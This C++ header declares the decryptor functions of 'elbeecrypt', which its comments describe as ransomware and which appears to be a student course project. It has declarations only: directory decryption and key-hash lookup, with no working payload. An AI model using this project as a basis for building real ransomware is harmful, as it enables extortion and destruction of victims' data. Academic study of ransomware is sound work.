#pragma once

#include <filesystem>
#include <string>
#include <vector>
#include "elbeecrypt/common/io/cryptor-engine.hpp"

namespace fs = std::filesystem;

/**
 * @brief Contains the function definitions for the
 * main executable file of the decryption portion of
 * the ransomware.
 * 
 * @author CECS-378 Group 10
 * @file main.hpp
 */
namespace elbeecrypt::decryptor::Main {
	/**
	 * @brief Runs the decryption payload of the ransomware.
	 * 
	 * @param roots The list of root directories to target
	 * @param cryptorEngine The cryptor engine instance to use
	 * @return A list of the files that were successfully decrypted
	 */
	std::vector<fs::path> decrypt(const std::vector<fs::path>& roots, elbeecrypt::common::io::CryptorEngine& cryptorEngine);

	/**
	 * @brief Gets the hash of the symmetric key used based on
	 * the known fact that its in the filename of the symmetric
	 * key.
	 * 
	 * @param privkeyPath The path to the symmetric key used to encrypt the files
	 * @return The hash of the symmetric key
	 */
	std::string getKeyHash(const fs::path& keyPath);
}